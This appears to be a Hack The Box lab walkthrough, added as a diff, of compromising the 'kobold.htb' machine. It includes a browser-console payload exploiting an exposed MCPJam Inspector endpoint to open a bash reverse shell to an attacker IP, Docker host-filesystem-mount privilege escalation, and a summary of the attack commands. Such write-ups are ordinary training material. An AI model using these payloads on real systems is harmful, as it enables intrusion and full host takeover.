@@ -1,0 +1,632 @@
+## Target Information
+
+- Target IP: `10.129.5.190`
+- Platform: Hack The Box
+- Main Technologies:
+    - Nginx
+    - MCPJam Inspector
+    - Node.js
+    - Docker
+- Vulnerabilities Exploited:
+    1. Exposed MCPJam Inspector interface
+    2. MCPJam Inspector Remote Code Execution
+    3. Arbitrary command execution via `/api/mcp/connect`
+    4. Reverse shell as `ben`
+    5. Docker privilege escalation
+    6. Host filesystem mounting
+    7. Root flag extraction
+
+---
+
+# 1. Initial Enumeration
+
+## Fast Nmap Scan
+
+```bash
+sudo nmap -T4 -Pn -sC -sV --top-ports 1000 10.129.5.190
+```
+
+## Scan Result
+
+```
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
+80/tcp  open  http     nginx 1.24.0
+443/tcp open  ssl/http nginx 1.24.0
+```
+
+### Additional Information
+
+```
+HTTP redirect:
+<https://kobold.htb>
+
+SSL Certificate:
+DNS:kobold.htb
+DNS:*.kobold.htb
+```
+
+This indicates:
+
+- Web application hosted on HTTPS
+- Virtual host configuration
+- Possible subdomains
+- Modern Ubuntu backend
+
+---
+
+# 2. Configure Local DNS Resolution
+
+The target uses virtual hosting, therefore hostname resolution is required.
+
+## Edit `/etc/hosts`
+
+```bash
+sudo nano /etc/hosts
+```
+
+Add:
+
+```
+10.129.5.190 kobold.htb
+```
+
+Verify:
+
+```bash
+ping kobold.htb
+```
+
+---
+
+# 3. Web Enumeration
+
+Visiting:
+
+```
+<https://kobold.htb>
+```
+
+revealed a web application but no obvious attack surface.
+
+The next step was subdomain enumeration.
+
+---
+
+# 4. Subdomain Enumeration
+
+## FFUF Virtual Host Enumeration
+
+```bash
+ffuf -u <https://kobold.htb> \\
+-H "Host: FUZZ.kobold.htb" \\
+-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
+-fs 0
+```
+
+## Result
+
+```
+mcp
+```
+
+Discovered subdomain:
+
+```
+mcp.kobold.htb
+```
+
+Add to `/etc/hosts`:
+
+```
+10.129.5.190 mcp.kobold.htb
+```
+
+---
+
+# 5. MCPJam Inspector Discovery
+
+Browsing to:
+
+```
+<https://mcp.kobold.htb>
+```
+
+revealed an exposed MCPJam Inspector interface.
+
+The interface allowed:
+
+- MCP server management
+- Dynamic server creation
+- Backend server spawning
+- JSON-based server configuration
+
+This immediately suggested dangerous functionality because user input appeared to directly control backend process execution.
+
+---
+
+# 6. Understanding MCPJam Inspector
+
+## What is MCPJam Inspector?
+
+MCPJam Inspector is a debugging and management interface for MCP (Model Context Protocol) servers.
+
+It allows users to:
+
+- Configure MCP servers
+- Start and stop services
+- Execute backend commands
+- Debug MCP integrations
+
+The critical issue:
+
+User-controlled JSON parameters were passed directly into backend process spawning logic.
+
+---
+
+# 7. MCPJam Inspector RCE Vulnerability
+
+## Root Cause
+
+The application exposed an unsafe API endpoint:
+
+```
+/api/mcp/connect
+```
+
+The endpoint accepted JSON like:
+
+```json
+{
+  "serverConfig": {
+    "command": "bash",
+    "args": ["-c", "id"],
+    "env": {}
+  }
+}
+```
+
+The backend executed these values directly.
+
+This resulted in:
+
+- Arbitrary command execution
+- Remote Code Execution (RCE)
+- No authentication restrictions
+- Full backend process spawning
+
+---
+
+# 8. Reverse Shell Exploitation
+
+## Start Netcat Listener
+
+On attacker machine:
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+# 9. Browser Console Exploitation
+
+Open browser developer tools:
+
+```
+F12 → Console
+```
+
+Paste the following payload:
+
+```jsx
+fetch('/api/mcp/connect', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    serverConfig: {
+      command: "bash",
+      args: [
+        "-c",
+        "bash -i >& /dev/tcp/10.10.14.215/4444 0>&1"
+      ],
+      env: {}
+    },
+    serverId: "revshell"
+  })
+})
+```
+
+---
+
+# 10. Reverse Shell Obtained
+
+Listener received connection:
+
+```
+connect to [10.10.14.215] from [10.129.5.190]
+```
+
+Check current user:
+
+```bash
+whoami
+```
+
+Output:
+
+```
+ben
+```
+
+---
+
+# 11. Shell Stabilization
+
+## Upgrade TTY
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Set terminal:
+
+```bash
+export TERM=xterm
+```
+
+Background shell:
+
+```
+CTRL + Z
+```
+
+Fix shell:
+
+```bash
+stty raw -echo; fg
+```
+
+Fully interactive shell obtained.
+
+---
+
+# 12. User Enumeration
+
+## Current Directory
+
+```bash
+pwd
+```
+
+Output:
+
+```
+/usr/local/lib/node_modules/@mcpjam/inspector
+```
+
+This confirmed:
+
+- Node.js application
+- Globally installed MCPJam Inspector
+- Running directly on host
+
+---
+
+# 13. Home Directory Enumeration
+
+## List Home Directories
+
+```bash
+ls -la /home
+```
+
+Output:
+
+```
+drwxr-x---  2 alice alice 4096 Mar 16 14:12 alice
+drwxr-x---  3 ben   ben   4096 Mar 16 14:12 ben
+```
+
+---
+
+# 14. User Flag
+
+## Read User Flag
+
+```bash
+cat /home/ben/user.txt
+```
+
+Output:
+
+```
+adc13616b3fe6e668704311a289e584c
+```
+
+---
+
+# 15. Group Enumeration
+
+## Check Groups
+
+```bash
+getent group
+```
+
+Interesting groups:
+
+```
+operator:x:37:ben,alice
+docker:x:111:alice
+```
+
+Observation:
+
+- `ben` belongs to `operator`
+- `alice` belongs to `docker`
+
+This suggested possible lateral movement or privilege escalation paths.
+
+---
+
+# 16. Docker Privilege Escalation Discovery
+
+Docker is dangerous because membership in the `docker` group effectively grants root-equivalent access.
+
+The goal became:
+
+- Access Docker
+- Mount host filesystem
+- Read root files
+
+---
+
+# 17. Switching to Docker Group
+
+## Spawn New Group Session
+
+```bash
+newgrp docker
+```
+
+This created a shell using the `docker` group.
+
+---
+
+# 18. Docker Privilege Escalation
+
+## Mount Entire Host Filesystem
+
+```bash
+docker run -it --rm \\
+-v /:/hostfs \\
+--user root \\
+--entrypoint /bin/bash \\
+privatebin/nginx-fpm-alpine:2.0.2
+```
+
+Explanation:
+
+- `v /:/hostfs`
+→ Mounts host root filesystem
+- `-user root`
+→ Runs container as root
+- `-entrypoint /bin/bash`
+→ Spawns shell
+
+This effectively provides root access to the host filesystem.
+
+---
+
+# 19. Root Flag Extraction
+
+Instead of interactive shell, directly read the root flag:
+
+```bash
+docker run -v /:/hostfs --rm \\
+--user root \\
+--entrypoint cat \\
+privatebin/nginx-fpm-alpine:2.0.2 \\
+/hostfs/root/root.txt
+```
+
+Output:
+
+```
+d25df4a57c64ada3b71b27844de26e4c
+```
+
+Root access successfully achieved.
+
+---
+
+# 20. Vulnerability Analysis
+
+## Vulnerability #1 — Exposed MCPJam Inspector
+
+### Issue
+
+Administrative debugging interface publicly accessible.
+
+### Impact
+
+- Backend command execution
+- Arbitrary process spawning
+- Full server compromise
+
+---
+
+## Vulnerability #2 — Unsafe Backend Command Execution
+
+### Dangerous API
+
+```
+/api/mcp/connect
+```
+
+### User-Controlled Values
+
+```json
+{
+  "command": "bash",
+  "args": ["-c", "..."]
+}
+```
+
+Backend executed these values directly.
+
+### Impact
+
+- Remote Code Execution
+- Full shell access
+
+---
+
+## Vulnerability #3 — Docker Privilege Escalation
+
+Docker allows:
+
+- Host filesystem mounting
+- Privileged container execution
+- Root-equivalent access
+
+### Abuse
+
+```bash
+-v /:/hostfs
+```
+
+Mounts host root filesystem inside container.
+
+---
+
+# 21. Important Techniques Learned
+
+## Web Exploitation
+
+- Virtual host enumeration
+- Subdomain fuzzing
+- MCP interface analysis
+- Browser console exploitation
+- API abuse
+
+---
+
+## Post Exploitation
+
+- Reverse shell handling
+- TTY stabilization
+- Linux enumeration
+- Group enumeration
+
+---
+
+## Privilege Escalation
+
+- Docker abuse
+- Host filesystem mounting
+- Container breakout concepts
+
+---
+
+# 22. Useful Commands Summary
+
+## Enumeration
+
+```bash
+sudo nmap -T4 -Pn -sC -sV --top-ports 1000 10.129.5.190
+```
+
+---
+
+## Virtual Host Enumeration
+
+```bash
+ffuf -u <https://kobold.htb> \\
+-H "Host: FUZZ.kobold.htb" \\
+-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
+-fs 0
+```
+
+---
+
+## Listener
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## MCPJam RCE Payload
+
+```jsx
+fetch('/api/mcp/connect', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    serverConfig: {
+      command: "bash",
+      args: [
+        "-c",
+        "bash -i >& /dev/tcp/10.10.14.215/4444 0>&1"
+      ],
+      env: {}
+    },
+    serverId: "revshell"
+  })
+})
+```
+
+---
+
+## Shell Stabilization
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```bash
+export TERM=xterm
+```
+
+```bash
+stty raw -echo; fg
+```
+
+---
+
+## Group Enumeration
+
+```bash
+getent group
+```
+
+---
+
+## Docker Privilege Escalation
+
+```bash
+newgrp docker
+```
+
+```bash
+docker run -it --rm \\
+-v /:/hostfs \\
+--user root \\
+--entrypoint /bin/bash \\
+privatebin/nginx-fpm-alpine:2.0.2
+```
+
+---
+
+## Read Root Flag
+
+```bash
+docker run -v /:/hostfs --rm \\
+--user root \\
+--entrypoint cat \\
+privatebin/nginx-fpm-alpine:2.0.2 \\
+/hostfs/root/root.txt
+```
